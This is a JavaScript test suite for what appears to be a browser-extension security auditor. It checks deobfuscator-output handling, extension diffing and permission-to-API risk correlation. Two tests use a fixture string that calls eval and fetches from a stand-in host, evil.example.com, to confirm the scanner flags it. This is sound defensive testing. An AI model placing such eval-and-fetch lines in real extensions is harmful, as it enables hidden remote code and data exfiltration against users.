test('buildEntryPointMap readability stats ignore files inside a <name>.wakaru directory with a sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  writeFileSync(path.join(dir, 'bundle.js'), 'x'.repeat(2000));
  mkdirSync(path.join(dir, 'bundle.wakaru'));
  writeFileSync(path.join(dir, 'bundle.wakaru', 'module-0.js'), 'x'.repeat(2000));
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");\n');

  const map = buildEntryPointMap(dir, null);
  assert.equal(map.readability.total, 2);
  assert.equal(map.readability.files.length, 2);
  assert.deepEqual(
    map.readability.files.map((f) => f.file).sort(),
    ['bundle.js', 'clean.js']
  );
  rmSync(dir, { recursive: true });
});

test('buildEntryPointMap still counts a shipped <name>.wakaru lookalike with no sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  mkdirSync(path.join(dir, 'evil.wakaru'));
  writeFileSync(path.join(dir, 'evil.wakaru', 'payload.js'), 'x'.repeat(2000));

  const map = buildEntryPointMap(dir, null);
  assert.equal(map.readability.total, 1);
  assert.equal(map.readability.files[0].file, path.join('evil.wakaru', 'payload.js'));
  rmSync(dir, { recursive: true });
});

test('auditExtension never scans a file that is humanify\'s own output for another file', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  writeFileSync(path.join(dir, 'min.js'), 'minified');
  writeFileSync(path.join(dir, 'min.humanify.js'), 'eval("danger"); fetch("https://evil.example.com");');
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 0);
  assert.equal(audit.endpoints.length, 0);
  rmSync(dir, { recursive: true });
});

test('auditExtension still scans a *.humanify.js file with no sibling <name>.js (not provably our output)', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  writeFileSync(path.join(dir, 'evil.humanify.js'), 'eval("danger"); fetch("https://evil.example.com");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 2);
  assert.equal(audit.endpoints.length, 1);
  rmSync(dir, { recursive: true });
});

test('buildEntryPointMap readability stats ignore a file that is humanify\'s own output for another file', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  writeFileSync(path.join(dir, 'min.js'), 'x'.repeat(2000));
  writeFileSync(path.join(dir, 'min.humanify.js'), 'x'.repeat(2000));
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");\n');

  const map = buildEntryPointMap(dir, null);
  assert.equal(map.readability.total, 2);
  assert.deepEqual(
    map.readability.files.map((f) => f.file).sort(),
    ['clean.js', 'min.js']
  );
  rmSync(dir, { recursive: true });
});

test('diffExtensions never reports files inside a <name>.wakaru directory as added/removed/modified', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'bundle.js': 'left', 'bundle.wakaru/module-0.js': 'left wakaru output' },
  });
  makeExtension(right, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'bundle.js': 'right', 'bundle.wakaru/module-0.js': 'right wakaru output' },
  });

  const diff = diffExtensions(left, right);
  assert.deepEqual(diff.files.added, []);
  assert.deepEqual(diff.files.removed, []);
  assert.deepEqual(diff.files.modified.map((f) => f.path), ['bundle.js']);

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('diffExtensions never reports a *.humanify.js file (with a sibling original) as added/removed/modified', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'min.js': 'left', 'min.humanify.js': 'left renamed' },
  });
  makeExtension(right, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'min.js': 'right', 'min.humanify.js': 'right renamed' },
  });

  const diff = diffExtensions(left, right);
  assert.deepEqual(diff.files.added, []);
  assert.deepEqual(diff.files.removed, []);
  assert.deepEqual(diff.files.modified.map((f) => f.path), ['min.js']);

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('auditExtension correlates a declared permission with a matching API call and scores it higher', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Cookie Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['cookies'],
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'chrome.cookies.getAll({}, () => {});' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.equal(audit.correlations.length, 1);
  assert.equal(audit.correlations[0].permission, 'cookies');
  assert.equal(audit.correlations[0].pattern, 'chrome.cookies access');
  assert.deepEqual(audit.correlations[0].files, ['bg.js']);

  // permission tier (3) + distinct high hit (2) + correlation bonus (2) = 7 -> high
  // (without the bonus this would be 5 -> medium; this is the intended effect).
  assert.equal(audit.risk.score, 7);
  assert.equal(audit.risk.level, 'high');

  const report = formatAuditReport(audit);
  assert.match(report, /declared permission/i);
  assert.doesNotMatch(report, /granted permission/i);
  rmSync(dir, { recursive: true });
});

test('formatAuditReport names the actual CRX version a verified signature checked, not a hardcoded CRX3', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  makeExtension(dir, { manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 }, files: {} });
  const audit = auditExtension(dir, null, null);

  audit.signature = { verified: true, extensionId: 'a'.repeat(32), reason: null, version: 2 };
  assert.match(formatAuditReport(audit), /verified store-signed CRX2/);

  audit.signature = { verified: true, extensionId: 'a'.repeat(32), reason: null, version: 3 };
  assert.match(formatAuditReport(audit), /verified store-signed CRX3/);
  rmSync(dir, { recursive: true });
});

test('auditExtension does not correlate a permission with no matching call anywhere', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Quiet Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['cookies'],
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'console.log("ok");' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.deepEqual(audit.correlations, []);
  rmSync(dir, { recursive: true });
});

test('auditExtension does not correlate a matching call when the permission is not declared', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'No Perm Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'chrome.cookies.getAll({}, () => {});' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.deepEqual(audit.correlations, []);
  rmSync(dir, { recursive: true });
});

test('auditExtension does not let a chrome.tabs.executeScript call correlate with the scripting permission', () => {
  // chrome.tabs.executeScript and chrome.scripting.executeScript are two
  // different APIs with two different permission requirements -- a hit on
  // the tabs.* one must never credit the unrelated 'scripting' permission.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Tabs Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['scripting'],
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'chrome.tabs.executeScript(1, { code: "1" });' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.deepEqual(audit.correlations, []);
  rmSync(dir, { recursive: true });
});
